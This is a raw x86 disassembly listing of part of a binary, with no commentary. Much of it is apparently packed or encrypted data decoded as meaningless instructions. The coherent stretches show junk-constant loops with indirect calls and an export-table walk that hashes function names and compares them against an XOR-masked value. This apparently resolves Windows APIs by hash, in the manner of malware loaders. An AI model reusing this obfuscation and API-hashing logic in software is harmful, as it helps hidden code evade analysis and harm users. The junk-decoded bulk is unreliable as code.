  419e9f:	(bad)  
  419ea0:	in     eax,0x7a
  419ea2:	xlat   BYTE PTR ds:[ebx]
  419ea3:	loope  0x419ead
  419ea5:	ja     0x419e32
  419ea7:	dec    esi
  419ea8:	aaa    
  419ea9:	daa    
  419eaa:	xor    eax,0x38918e27
  419eaf:	add    cl,BYTE PTR [esi]
  419eb1:	mov    ds:0xeb05f877,al
  419eb6:	sub    eax,0xc0fe2798
  419ebb:	xor    dl,BYTE PTR [edi+eiz*4]
  419ebe:	mov    al,ds:0x184c84dc
  419ec3:	aaa    
  419ec4:	push   ecx
  419ec5:	std    
  419ec6:	dec    ebx
  419ec7:	adc    al,cl
  419ec9:	push   ss
  419eca:	das    
  419ecb:	out    0x40,al
  419ecd:	push   ds
  419ece:	xchg   edi,eax
  419ecf:	fnstsw WORD PTR [edx+edx*1]
  419ed2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ed3:	int3   
  419ed4:	nop
  419ed5:	stos   BYTE PTR es:[edi],al
  419ed6:	xchg   esp,esp
  419ed8:	bound  edx,QWORD PTR [eax]
  419eda:	jb     0x419f28
  419edc:	xchg   esp,eax
  419edd:	repnz cld 
  419edf:	add    eax,0x648b2eb5
  419ee4:	mov    DWORD PTR [ecx+0x4c],eax
  419ee7:	mov    ds:0xf27500f,eax
  419eec:	and    eax,DWORD PTR [edi]
  419eee:	push   ss
  419eef:	mov    dh,0x45
  419ef1:	in     al,0x57
  419ef3:	repz inc esi
  419ef5:	mov    ebx,0xbfb24ff1
  419efa:	rcl    ebp,cl
  419efc:	jbe    0x419ee5
  419efe:	jl     0x419eb7
  419f00:	sbb    eax,0x144cc999
  419f05:	xchg   edx,eax
  419f06:	repz or eax,0xa3949a10
  419f0c:	inc    esp
  419f0d:	call   0x8a1035c9
  419f12:	dec    edx
  419f13:	mov    DWORD PTR [ebp-0x17],edi
  419f16:	push   ebp
  419f17:	test   BYTE PTR [esp+edx*8+0x29],0xfc
  419f1c:	mov    DWORD PTR [ecx],edi
  419f1e:	shl    edx,0xfd
  419f21:	adc    BYTE PTR [esi],bh
  419f23:	lods   eax,DWORD PTR ds:[esi]
  419f24:	xchg   ecx,eax
  419f25:	mov    cl,0x56
  419f27:	pushf  
  419f28:	(bad)
  419f2b:	cmp    ebp,DWORD PTR [edi-0x1f]
  419f2e:	fist   DWORD PTR ds:0xf14071f9
  419f34:	xchg   DWORD PTR [eax],ecx
  419f36:	mov    edx,0x739947ed
  419f3b:	jne    0x419f8e
  419f3d:	xchg   esi,eax
  419f3e:	icebp  
  419f3f:	cwde   
  419f40:	push   edx
  419f41:	mov    bl,0x8a
  419f43:	scas   eax,DWORD PTR es:[edi]
  419f44:	fs xchg bp,ax
  419f47:	inc    ebx
  419f48:	sub    BYTE PTR ds:0xabf5886b,ch
  419f4e:	sbb    ebp,DWORD PTR [ebp+0x41014250]
  419f54:	xchg   esp,eax
  419f55:	mov    esp,0x9a1c2353
  419f5a:	or     dl,BYTE PTR [eax-0x60b47a61]
  419f60:	sub    BYTE PTR [esi+0x5b78bfd4],ah
  419f66:	shl    dh,1
  419f68:	pop    edx
  419f69:	and    bl,BYTE PTR [edi+0x7a7e1de1]
  419f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f70:	push   ss
  419f71:	out    0x19,al
  419f73:	dec    edx
  419f74:	loop   0x419fb1
  419f76:	cmp    eax,0x2da4b1fa
  419f7b:	fsubr  DWORD PTR [esi+edi*1-0x74]
  419f7f:	mov    bl,0xc2
  419f81:	lods   al,BYTE PTR ds:[esi]
  419f82:	jne    0x419fc6
  419f84:	ror    BYTE PTR [esi],0x51
  419f87:	add    eax,0x438b88ce
  419f8c:	fild   WORD PTR [esi-0x6ece2d58]
  419f92:	xlat   BYTE PTR ds:[ebx]
  419f93:	lea    esp,[edx+0x43]
  419f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f97:	or     esp,DWORD PTR [ecx]
  419f99:	cmp    esp,edx
  419f9b:	pop    ebx
  419f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f9d:	add    edx,DWORD PTR [edi+edi*8]
  419fa0:	jne    0x41a637
  419fa6:	add    DWORD PTR ds:0x42a7c5,0x42a761
  419fb0:	push   DWORD PTR [ebp+0x8]
  419fb3:	or     DWORD PTR ds:0x42a871,0x48c2
  419fbd:	call   0x4175e1
  419fc2:	and    DWORD PTR ds:0x42a835,edi
  419fc8:	mov    DWORD PTR [ebp-0x20],eax
  419fcb:	jmp    0x41a200
  419fd0:	aas    
  419fd1:	into   
  419fd2:	leave  
  419fd3:	int    0xd9
  419fd5:	(bad)  
  419fd7:	into   
  419fd8:	fwait
  419fd9:	or     BYTE PTR [eax-0x74],0x42
  419fdd:	lds    edx,FWORD PTR [ebx-0x1a]
  419fe0:	adc    bl,0x7f
  419fe3:	js     0x419ff5
  419fe5:	jle    0x41a05f
  419fe7:	js     0x419ffe
  419fe9:	push   edx
  419fea:	sub    ch,bl
  419fec:	mov    ecx,0x36cb238d
  419ff1:	xchg   edx,eax
  419ff2:	pop    edx
  419ff3:	int    0xf6
  419ff5:	cdq    
  419ff6:	rcr    BYTE PTR [ebx+0x79],cl
  419ff9:	and    BYTE PTR [edi-0x4e349d61],dh
  419fff:	aas    
  41a000:	sbb    al,BYTE PTR [edi+0x1c]
  41a003:	(bad)  
  41a004:	ins    BYTE PTR es:[edi],dx
  41a005:	(bad)  
  41a007:	test   eax,0xa4ad6a3e
  41a00c:	scas   al,BYTE PTR es:[edi]
  41a00d:	fild   DWORD PTR [edi+0x2faeab25]
  41a013:	xor    BYTE PTR [ebp-0x736e4e4a],ch
  41a019:	test   al,0x55
  41a01b:	adc    ecx,ebx
  41a01d:	rol    DWORD PTR [ecx+0x7f642864],cl
  41a023:	mov    ebx,0xa5effb5f
  41a028:	xchg   esp,eax
  41a029:	daa    
  41a02a:	mov    ds:0xb8334daf,al
  41a02f:	popf   
  41a030:	sar    DWORD PTR [ebp-0x2bd09e58],cl
  41a036:	mul    BYTE PTR [edx+0x2fa4380a]
  41a03c:	mov    ebp,0xecdf8b09
  41a041:	cld    
  41a042:	ret    
  41a043:	add    BYTE PTR [edx+esi*4-0x644afdd3],bl
  41a04a:	xchg   DWORD PTR gs:[edx],esp
  41a04d:	dec    ebx
  41a04e:	push   eax
  41a04f:	jbe    0x41a07f
  41a051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a052:	aaa    
  41a053:	stc    
  41a054:	sbb    al,bh
  41a056:	adc    eax,DWORD PTR [ecx+ecx*4-0x1cb89351]
  41a05d:	rol    BYTE PTR [edi+0x18fbc436],0xa9
  41a064:	aas    
  41a065:	loop   0x41a0e4
  41a067:	xlat   BYTE PTR ds:[ebx]
  41a068:	mov    eax,0xdb4e161a
  41a06d:	or     ecx,edx
  41a06f:	or     eax,0x8e6e9a7
  41a074:	mov    ds:0x2c2dd939,al
  41a079:	pop    ds
  41a07a:	sub    al,cl
  41a07c:	push   ss
  41a07d:	jno    0x41a0f2
  41a07f:	popa   
  41a080:	test   eax,0xbe46418c
  41a085:	dec    esp
  41a086:	aad    0x7b
  41a088:	(bad)  
  41a089:	inc    edi
  41a08a:	jno    0x41a0b9
  41a08c:	adc    BYTE PTR [edx+0x4e],bl
  41a08f:	retf   
  41a090:	inc    edx
  41a091:	inc    ecx
  41a092:	ins    BYTE PTR es:[edi],dx
  41a093:	jae    0x41a0c1
  41a095:	dec    esp
  41a096:	popa   
  41a097:	ins    DWORD PTR es:[edi],dx
  41a098:	mov    ecx,0x934708dc
  41a09d:	test   al,0xd1
  41a09f:	add    BYTE PTR ds:0xda0ae6bc,ah
  41a0a5:	push   edi
  41a0a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0a7:	inc    esp
  41a0a8:	pushf  
  41a0a9:	cmp    eax,0x3e2af008
  41a0ae:	scas   eax,DWORD PTR es:[edi]
  41a0af:	outs   dx,BYTE PTR ds:[esi]
  41a0b0:	push   es
  41a0b1:	push   ss
  41a0b2:	xchg   esi,eax
  41a0b3:	pop    ebx
  41a0b4:	mov    bh,0x2b
  41a0b6:	mov    ecx,0xd165c240
  41a0bb:	(bad)  
  41a0bc:	and    DWORD PTR [esi-0x29],ebp
  41a0bf:	or     ebx,0x5d4d6e3e
  41a0c5:	js     0x41a0ec
  41a0c7:	loope  0x41a099
  41a0c9:	retf   0x6d79
  41a0cc:	cmp    BYTE PTR [esi],dl
  41a0ce:	mov    ds:0x9e7664d1,eax
  41a0d3:	data16 (bad) 
  41a0d5:	pop    ebx
  41a0d6:	test   BYTE PTR [edi+ebx*1-0x12],cl
  41a0da:	gs pop esi
  41a0dc:	sbb    cl,BYTE PTR [eax+0x31]
  41a0df:	pop    es
  41a0e0:	push   ds
  41a0e1:	jb     0x41a140
  41a0e3:	jno    0x41a094
  41a0e5:	dec    esp
  41a0e6:	rcl    DWORD PTR gs:[edx+0x49],0x64
  41a0eb:	je     0x41a116
  41a0ed:	xor    ch,BYTE PTR [ecx+0x27]
  41a0f0:	inc    esi
  41a0f1:	push   0x20
  41a0f3:	adc    eax,0xcc821c91
  41a0f8:	cdq    
  41a0f9:	loop   0x41a175
  41a0fb:	nop
  41a0fc:	pop    esi
  41a0fd:	jecxz  0x41a100
  41a0ff:	in     al,0x9a
  41a101:	enter  0xcac,0x17
  41a105:	popa   
  41a106:	push   ebp
  41a107:	sub    DWORD PTR ds:0x7720bed9,edx
  41a10d:	int    0x44
  41a10f:	pop    eax
  41a110:	je     0x41a176
  41a112:	loop   0x41a169
  41a114:	mov    bl,0xbc
  41a116:	sub    DWORD PTR [eax],edx
  41a118:	mov    ds:0x2038581,al
  41a11d:	sti    
  41a11e:	jg     0x41a16d
  41a120:	pop    ecx
  41a121:	scas   al,BYTE PTR es:[edi]
  41a122:	jle    0x41a152
  41a124:	xchg   DWORD PTR gs:[edx],eax
  41a127:	fistp  QWORD PTR [esi-0xe156add]
  41a12d:	mov    BYTE PTR cs:[edi-0x38f6f406],ah
  41a134:	xchg   ch,ah
  41a136:	sub    WORD PTR [edx],di
  41a139:	cli    
  41a13a:	inc    edi
  41a13b:	dec    ebp
  41a13c:	fadd   QWORD PTR [edi+0x1fdf53b1]
  41a142:	ds xchg esi,eax
  41a144:	(bad)  
  41a145:	xchg   DWORD PTR [edx],ebp
  41a147:	xchg   ah,ah
  41a149:	inc    edx
  41a14a:	outs   dx,DWORD PTR ds:[esi]
  41a14b:	out    dx,eax
  41a14c:	sbb    al,0xb4
  41a14e:	adc    DWORD PTR [edx+0x73],ebp
  41a151:	cdq    
  41a152:	and    bh,bh
  41a154:	jae    0x41a190
  41a156:	mov    ch,0xff
  41a158:	ja     0x41a167
  41a15a:	dec    esi
  41a15b:	and    edx,DWORD PTR [eax+ebp*1-0x5b]
  41a15f:	mov    esp,0xbbca15c5
  41a164:	aas    
  41a165:	test   eax,0x726fd4fd
  41a16a:	pop    edx
  41a16b:	xor    eax,0x161fd99b
  41a170:	sub    al,0x16
  41a172:	adc    al,cl
  41a174:	(bad)  
  41a175:	jb     0x41a168
  41a177:	add    bh,BYTE PTR [esp+eax*2+0x38c559d3]
  41a17e:	jns    0x41a19f
  41a180:	mov    ebx,0x4416610
  41a185:	fs sbb eax,0x5e
  41a189:	push   edi
  41a18a:	fiadd  DWORD PTR [eax-0x34]
  41a18d:	pop    edx
  41a18e:	mov    ebp,0x42d16c5a
  41a193:	enter  0xe4e6,0x3e
  41a197:	popf   
  41a198:	jl     0x41a168
  41a19a:	push   ecx
  41a19b:	pop    edx
  41a19c:	mov    eax,ds:0xd663664c
  41a1a1:	xchg   ebp,eax
  41a1a2:	jecxz  0x41a218
  41a1a4:	inc    ebp
  41a1a5:	or     cl,BYTE PTR [ecx+0x7]
  41a1a8:	add    bl,BYTE PTR [eax-0x28]
  41a1ab:	dec    ebp
  41a1ac:	sub    al,0x32
  41a1ae:	sahf   
  41a1af:	stos   BYTE PTR es:[edi],al
  41a1b0:	sub    eax,0x3ec202b2
  41a1b5:	mov    WORD PTR [ebp-0x79314af7],cs
  41a1bb:	addr16 inc edx
  41a1bd:	jne    0x41a1fc
  41a1bf:	retf   
  41a1c0:	push   edx
  41a1c1:	into   
  41a1c2:	or     edx,ebp
  41a1c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1c5:	jo     0x41a1bf
  41a1c7:	jae    0x41a1e2
  41a1c9:	sbb    edx,DWORD PTR [ebx]
  41a1cb:	imul   ecx,DWORD PTR [edi-0x78],0x4e
  41a1cf:	lds    ebx,FWORD PTR [ebx]
  41a1d1:	ror    bh,0x42
  41a1d4:	fmul   DWORD PTR [edi+0x505671d]
  41a1da:	mov    cl,0x3f
  41a1dc:	lods   eax,DWORD PTR ds:[esi]
  41a1dd:	(bad)  
  41a1de:	adc    BYTE PTR [edx+0x316f5a1c],dl
  41a1e4:	or     al,0x36
  41a1e6:	stos   DWORD PTR es:[edi],eax
  41a1e7:	sbb    dl,BYTE PTR [edx*2+0x121178a4]
  41a1ee:	or     eax,0xf003f784
  41a1f3:	cwde   
  41a1f4:	cmp    BYTE PTR [ecx+0x37],ch
  41a1f7:	data16 lahf 
  41a1f9:	mov    edx,0x7897db20
  41a1ff:	mov    ebx,0x8bfc458b
  41a204:	dec    ebp
  41a205:	loopne 0x41a1ce
  41a207:	add    eax,0x42a7b1
  41a20c:	sbb    al,0x0
  41a20e:	add    BYTE PTR [eax],al
  41a210:	cmp    DWORD PTR ds:0x42a7b1,0x0
  41a217:	je     0x41a247
  41a21d:	cmp    DWORD PTR ds:0x42a7b1,0x29
  41a224:	jne    0x41a233
  41a22a:	push   DWORD PTR [ebp-0xc]
  41a22d:	call   DWORD PTR ds:0x41d124
  41a233:	xor    esi,esi
  41a235:	xor    esi,DWORD PTR ds:0x42a7b1
  41a23b:	dec    esi
  41a23c:	mov    DWORD PTR ds:0x42a7b1,esi
  41a242:	jmp    0x41a210
  41a247:	mov    esi,0x7510850
  41a24c:	mov    DWORD PTR ds:0x42a84d,0x3f72
  41a256:	xor    eax,esi
  41a258:	add    eax,ebx
  41a25a:	cmp    ecx,eax
  41a25c:	mov    DWORD PTR ds:0x42a76d,0x752f
  41a266:	je     0x41a678
  41a26c:	push   DWORD PTR [ebp-0x20]
  41a26f:	sub    DWORD PTR ds:0x42a759,0x42a84d
  41a279:	push   DWORD PTR [ebp+0x8]
  41a27c:	call   0x408a76
  41a281:	jmp    0x41a4b6
  41a286:	(bad)  
  41a287:	les    edi,FWORD PTR [edi]
  41a289:	iret   
  41a28a:	rcr    ebx,1
  41a28c:	(bad)  
  41a28d:	leave  
  41a28e:	push   edi
  41a28f:	push   edx
  41a290:	in     al,dx
  41a291:	je     0x41a2d7
  41a293:	scas   eax,DWORD PTR es:[edi]
  41a294:	daa    
  41a295:	dec    ebx
  41a296:	cwde   
  41a297:	sar    DWORD PTR [edi+0x78],1
  41a29a:	adc    BYTE PTR [esi+0x78],bh
  41a29d:	js     0x41a24c
  41a29f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2a0:	fs pop ss
  41a2a2:	inc    eax
  41a2a3:	pop    edx
  41a2a4:	stos   BYTE PTR es:[edi],al
  41a2a5:	test   esi,esp
  41a2a7:	loop   0x41a31b
  41a2a9:	mov    edx,0xc4d8fb24
  41a2ae:	push   ecx
  41a2af:	lea    ebp,[ecx]
  41a2b1:	dec    esp
  41a2b2:	repnz mov ds:0x20a9cc56,al
  41a2b8:	es xor eax,0x19f50d9a
  41a2be:	les    edi,FWORD PTR [esi-0x68]
  41a2c1:	loop   0x41a32b
  41a2c3:	push   edi
  41a2c4:	jno    0x41a2df
  41a2c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2c7:	jnp    0x41a30c
  41a2c9:	sti    
  41a2ca:	shr    BYTE PTR [ecx],cl
  41a2cc:	or     al,dh
  41a2ce:	or     BYTE PTR [eax+edx*8+0x72010e77],ah
  41a2d5:	jmp    0x9bcd4117
  41a2da:	jno    0x41a266
  41a2dc:	loopne 0x41a342
  41a2de:	cld    
  41a2df:	mov    ch,0x3b
  41a2e1:	dec    esi
  41a2e2:	xor    dh,bl
  41a2e4:	adc    al,0x52
  41a2e6:	push   ss
  41a2e7:	mov    al,ds:0xfb23d4c8
  41a2ec:	mov    edi,edi
  41a2ee:	clc    
  41a2ef:	and    BYTE PTR [ebp+0x50ca71e9],bh
  41a2f5:	add    eax,0x8052b032
  41a2fa:	sbb    BYTE PTR [esi+edx*1],ch
  41a2fd:	or     BYTE PTR [edx-0x4f],ah
  41a300:	mov    esi,0x21c63ff6
  41a305:	or     DWORD PTR [esi-0x1a],ebx
  41a308:	fidiv  WORD PTR [edi]
  41a30a:	mov    edi,DWORD PTR [eax-0x63]
  41a30d:	enter  0xfce0,0x87
  41a311:	inc    ecx
  41a312:	(bad)  
  41a313:	ins    BYTE PTR es:[edi],dx
  41a314:	pop    ss
  41a315:	add    al,0xef
  41a317:	jo     0x41a36b
  41a319:	outs   dx,DWORD PTR ds:[esi]
  41a31a:	enter  0xdefa,0xfa
  41a31e:	repnz test DWORD PTR [ebx+0x4b],eax
  41a322:	sub    esi,DWORD PTR [esi+edx*8]
  41a325:	sub    DWORD PTR [ecx-0x39],eax
  41a328:	jbe    0x41a359
  41a32a:	into   
  41a32b:	mov    dl,0x49
  41a32d:	mov    eax,DWORD PTR [eax+0x6]
  41a330:	cwde   
  41a331:	push   esp
  41a332:	and    bh,BYTE PTR [eax]
  41a334:	out    dx,al
  41a335:	jae    0x41a2c3
  41a337:	ins    DWORD PTR es:[edi],dx
  41a338:	jmp    0xbd7819c7
  41a33d:	pop    ds
  41a33e:	adc    DWORD PTR [eax-0x67235ad1],esp
  41a344:	out    dx,al
  41a345:	pmullw mm5,QWORD PTR [esi]
  41a348:	inc    esi
  41a349:	rcl    BYTE PTR [eax],cl
  41a34b:	pop    esi
  41a34c:	in     al,0x97
  41a34e:	addr16 dec ebx
  41a350:	not    DWORD PTR [ebx]
  41a352:	mov    ch,0x8c
  41a354:	rol    BYTE PTR [edx+0x724a008b],1
  41a35a:	xchg   ebx,eax
  41a35b:	adc    esi,DWORD PTR [ebp+0xff119a6]
  41a361:	sbb    eax,0x400eab97
  41a366:	adc    BYTE PTR [ebx],al
  41a368:	call   0x44fa4363
  41a36d:	mov    cl,BYTE PTR [ecx]
  41a36f:	mov    esi,0x8025d72f
  41a374:	out    0x65,al
  41a376:	test   al,0x32
  41a378:	cmp    eax,DWORD PTR [ebp+0x61]
  41a37b:	(bad)  
  41a37c:	ins    DWORD PTR es:[edi],dx
  41a37d:	ret    0x8fef
  41a380:	and    eax,0x66ed60b
  41a385:	adc    eax,0xc8674cf
  41a38a:	test   DWORD PTR [ebp-0x2ebe77c1],0xe6a4e358
  41a394:	and    al,0xcc
  41a396:	add    al,0x82
  41a398:	xor    esi,esi
  41a39a:	inc    edi
  41a39b:	jl     0x41a3b5
  41a39d:	fild   QWORD PTR [eax]
  41a39f:	cmp    al,0x71
  41a3a1:	fwait
  41a3a2:	push   esp
  41a3a3:	mov    ecx,0x9314ec03
  41a3a8:	and    DWORD PTR [edx],esi
  41a3aa:	mov    ecx,0xbd178eab
  41a3af:	fwait
  41a3b0:	push   cs
  41a3b1:	(bad)  
  41a3b3:	ret    
  41a3b4:	neg    ebx
  41a3b6:	adc    DWORD PTR [edx],ebp
  41a3b8:	cmp    DWORD PTR [eax-0x75518cc5],edi
  41a3be:	test   DWORD PTR [esi-0x1272b832],ebp
  41a3c4:	inc    ebx
  41a3c5:	bound  esi,QWORD PTR [ecx-0x1]
  41a3c8:	test   eax,0xcb2e2a6e
  41a3cd:	cwde   
  41a3ce:	stos   BYTE PTR es:[edi],al
  41a3cf:	out    dx,eax
  41a3d0:	xchg   edx,eax
  41a3d1:	dec    edi
  41a3d2:	mov    al,ds:0xdbeeb4c7
  41a3d7:	inc    esp
  41a3d8:	mov    bh,0x5d
  41a3da:	xor    edi,ebx
  41a3dc:	jg     0x41a3ac
  41a3de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3df:	repnz sti 
  41a3e1:	pop    es
  41a3e2:	mov    edi,0xd666aea9
  41a3e7:	sub    eax,0x87f9bfdc
  41a3ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3ed:	rcr    BYTE PTR [ebp+ecx*4-0x3ffc0550],1
  41a3f4:	test   eax,0x2424bbaf
  41a3f9:	add    ch,al
  41a3fb:	jnp    0x41a455
  41a3fd:	stos   DWORD PTR es:[edi],eax
  41a3fe:	xlat   BYTE PTR ds:[ebx]
  41a3ff:	cmp    ah,BYTE PTR [edi+0x13]
  41a402:	mov    ah,0xf0
  41a404:	mov    dl,0x9b
  41a406:	inc    ebp
  41a407:	ins    DWORD PTR es:[edi],dx
  41a408:	cli    
  41a409:	or     al,0xa3
  41a40b:	xchg   esi,eax
  41a40c:	aad    0xaa
  41a40e:	test   eax,0xf1585e1d
  41a413:	mov    ecx,0x36fddd79
  41a418:	sbb    eax,0xac105d74
  41a41d:	sahf   
  41a41e:	and    ebx,DWORD PTR [esi]
  41a420:	add    eax,0xf10d670f
  41a425:	xchg   ebp,eax
  41a426:	ja     0x41a46a
  41a428:	or     edx,DWORD PTR [ebp-0x661102fd]
  41a42e:	xchg   esp,eax
  41a42f:	cwde   
  41a430:	add    eax,0xa598f5e4
  41a435:	(bad)  
  41a437:	xchg   DWORD PTR ds:[edx-0x2],esp
  41a43b:	jae    0x41a3d6
  41a43d:	jne    0x41a463
  41a43f:	icebp  
  41a440:	sub    al,0x45
  41a442:	xor    al,0xa8
  41a444:	xor    bh,ch
  41a446:	hlt    
  41a447:	ret    0xf3c2
  41a44a:	or     al,0xf1
  41a44c:	fdivr  st(3),st
  41a44e:	sub    bl,bh
  41a450:	xchg   edx,eax
  41a451:	ins    DWORD PTR es:[edi],dx
  41a452:	addr16 repnz mov edx,ebp
  41a456:	jp     0x41a40f
  41a458:	(bad)  
  41a459:	mov    ecx,0x2be60748
  41a45e:	sub    BYTE PTR [ebp+0x1fae1b69],al
  41a464:	dec    ecx
  41a465:	push   edi
  41a466:	dec    edx
  41a467:	add    BYTE PTR [esi-0x71419a97],dl
  41a46d:	ins    BYTE PTR es:[edi],dx
  41a46e:	mov    eax,ds:0xc758e3e7
  41a473:	adc    bl,cl
  41a475:	outs   dx,DWORD PTR ds:[esi]
  41a476:	inc    ecx
  41a477:	dec    ebp
  41a478:	and    BYTE PTR [edx+0x6d],bh
  41a47b:	inc    ebp
  41a47c:	and    DWORD PTR [eax-0x63],eax
  41a47f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a480:	or     ch,dh
  41a482:	(bad)  
  41a483:	sti    
  41a484:	xor    al,0x94
  41a486:	fsub   QWORD PTR [edx]
  41a488:	sbb    DWORD PTR [eax+0x1afad866],ecx
  41a48e:	mov    edx,0xa43ef230
  41a493:	ins    DWORD PTR es:[edi],dx
  41a494:	int3   
  41a495:	or     al,0x5d
  41a497:	loopne 0x41a448
  41a499:	push   ecx
  41a49a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a49b:	aad    0xe5
  41a49d:	call   0x93e62b87
  41a4a2:	or     esi,DWORD PTR [edx+edi*1-0x6413f51c]
  41a4a9:	sub    dl,BYTE PTR [edi+0x3c]
  41a4ac:	mov    dh,0x9a
  41a4ae:	sub    al,0x41
  41a4b0:	mov    DWORD PTR [eax+0x446d7aac],esp
  41a4b6:	mov    DWORD PTR [ebp-0x14],eax
  41a4b9:	mov    DWORD PTR ds:0x42a75d,0x18
  41a4c3:	cmp    DWORD PTR ds:0x42a75d,0x0
  41a4ca:	je     0x41a5f6
  41a4d0:	cmp    DWORD PTR ds:0x42a75d,0x1a
  41a4d7:	jne    0x41a4e8
  41a4dd:	push   0x3f0b
  41a4e2:	call   DWORD PTR ds:0x41d200
  41a4e8:	mov    eax,ds:0x42a75d
  41a4ed:	dec    eax
  41a4ee:	mov    ds:0x42a75d,eax
  41a4f3:	jmp    0x41a4c3
  41a4f8:	and    DWORD PTR ds:0x42a7f1,0x0
  41a502:	jmp    0x41a512
  41a507:	mov    eax,ds:0x42a7f1
  41a50c:	inc    eax
  41a50d:	mov    ds:0x42a7f1,eax
  41a512:	cmp    DWORD PTR ds:0x42a7f1,0x1f
  41a519:	jae    0x41a5f6
  41a51f:	cmp    DWORD PTR ds:0x42a7f1,0x8
  41a526:	jne    0x41a53f
  41a52c:	push   0x8add
  41a531:	push   0x6acd
  41a536:	push   DWORD PTR [ebp-0x20]
  41a539:	call   DWORD PTR ds:0x41d128
  41a53f:	cmp    DWORD PTR ds:0x42a7f1,0x7
  41a546:	jne    0x41a557
  41a54c:	mov    eax,ds:0x42a7f1
  41a551:	inc    eax
  41a552:	mov    ds:0x42a7f1,eax
  41a557:	jmp    0x41a507
  41a55c:	mov    DWORD PTR ds:0x42a77d,0x11
  41a566:	cmp    DWORD PTR ds:0x42a77d,0x0
  41a56d:	je     0x41a5f6
  41a573:	cmp    DWORD PTR ds:0x42a77d,0x1d
  41a57a:	jne    0x41a58b
  41a580:	push   0x75df
  41a585:	call   DWORD PTR ds:0x41d12c
  41a58b:	mov    eax,ds:0x42a77d
  41a590:	dec    eax
  41a591:	mov    ds:0x42a77d,eax
  41a596:	jmp    0x41a566
  41a59b:	and    DWORD PTR ds:0x42a759,0x0
  41a5a5:	mov    ecx,DWORD PTR ds:0x42a759
  41a5ab:	inc    ecx
  41a5ac:	mov    DWORD PTR ds:0x42a759,ecx
  41a5b2:	cmp    DWORD PTR ds:0x42a759,0xb
  41a5b9:	jne    0x41a5cd
  41a5bf:	push   DWORD PTR [ebp-0x28]
  41a5c2:	push   0x2f79
  41a5c7:	call   DWORD PTR ds:0x41d204
  41a5cd:	cmp    DWORD PTR ds:0x42a759,0xa
  41a5d4:	jne    0x41a5e9
  41a5da:	xor    ecx,ecx
  41a5dc:	add    ecx,DWORD PTR ds:0x42a759
  41a5e2:	inc    ecx
  41a5e3:	mov    DWORD PTR ds:0x42a759,ecx
  41a5e9:	cmp    DWORD PTR ds:0x42a759,0x15
  41a5f0:	jb     0x41a5a5
  41a5f6:	mov    eax,DWORD PTR [ebp-0x4]
  41a5f9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a5fc:	xor    eax,esi
  41a5fe:	add    eax,ebx
  41a600:	cmp    ecx,eax
  41a602:	je     0x41a678
  41a608:	mov    eax,DWORD PTR [ebp-0x14]
  41a60b:	mov    eax,DWORD PTR [eax+0x18]
  41a60e:	mov    DWORD PTR [ebp-0x20],eax
  41a611:	mov    eax,DWORD PTR [ebp-0x14]
  41a614:	mov    ecx,DWORD PTR [ebp+0x8]
  41a617:	add    ecx,DWORD PTR [eax+0x20]
  41a61a:	mov    DWORD PTR [ebp-0x28],ecx
  41a61d:	mov    eax,DWORD PTR [ebp-0x14]
  41a620:	mov    ecx,DWORD PTR [ebp+0x8]
  41a623:	add    ecx,DWORD PTR [eax+0x24]
  41a626:	mov    DWORD PTR [ebp-0x2c],ecx
  41a629:	mov    eax,DWORD PTR [ebp-0x14]
  41a62c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a62f:	add    ecx,DWORD PTR [eax+0x1c]
  41a632:	xor    esi,esi
  41a634:	mov    DWORD PTR [ebp-0x14],ecx
  41a637:	mov    eax,DWORD PTR [ebp-0x28]
  41a63a:	mov    ecx,DWORD PTR [ebp+0x8]
  41a63d:	add    ecx,DWORD PTR [eax+edi*4]
  41a640:	lea    eax,[ebp-0x8]
  41a643:	mov    DWORD PTR [ebp-0x30],ecx
  41a646:	push   eax
  41a647:	push   DWORD PTR [ebp-0x30]
  41a64a:	push   DWORD PTR [ebp+0xc]
  41a64d:	call   0x4068d8
  41a652:	mov    eax,DWORD PTR [ebp-0x4]
  41a655:	mov    ecx,DWORD PTR [ebp-0x8]
  41a658:	xor    eax,0x7510850
  41a65d:	add    eax,ebx
  41a65f:	cmp    ecx,eax
  41a661:	jne    0x41a8b9
  41a667:	mov    eax,DWORD PTR [ebp-0x20]
  41a66a:	inc    edi
  41a66b:	cmp    edi,eax
  41a66d:	jb     0x419d40
  41a673:	jmp    0x41a8c9
  41a678:	mov    eax,DWORD PTR [ebp-0x4]
  41a67b:	xor    eax,esi
  41a67d:	jmp    0x41a8b2
  41a682:	retf   0xccc3
  41a685:	cmp    al,0xd9
  41a687:	rcr    edx,cl
  41a689:	leave  
  41a68a:	mov    esp,gs
  41a68c:	and    al,0x1
  41a68e:	ret    0x902e
  41a691:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a692:	mov    al,0xd7
  41a694:	jg     0x41a70e
  41a696:	adc    BYTE PTR [esi+0x78],bh
  41a699:	js     0x41a6df
  41a69b:	out    0x49,al
  41a69d:	sbb    cl,BYTE PTR [edx]
  41a69f:	push   ds
  41a6a0:	dec    eax
  41a6a1:	jge    0x41a690
  41a6a3:	setns  BYTE PTR [ebx-0x41]
  41a6a7:	rcr    BYTE PTR [ecx],1
  41a6a9:	adc    DWORD PTR es:[ecx+0x5c],esi
  41a6ad:	add    edi,DWORD PTR [ebx]
  41a6af:	jle    0x41a6ce
  41a6b1:	push   ecx
  41a6b2:	ja     0x41a664
  41a6b4:	shl    DWORD PTR [edx*2+0x19ea8e02],1
  41a6bb:	xlat   BYTE PTR ds:[ebx]
  41a6bc:	aaa    
  41a6bd:	push   es
  41a6be:	aad    0xd2
  41a6c0:	out    0xad,al
  41a6c2:	loop   0x41a66a
  41a6c4:	dec    ebp
  41a6c5:	add    bl,BYTE PTR [edx+ecx*8+0x51]
  41a6c9:	nop
  41a6ca:	cwde   
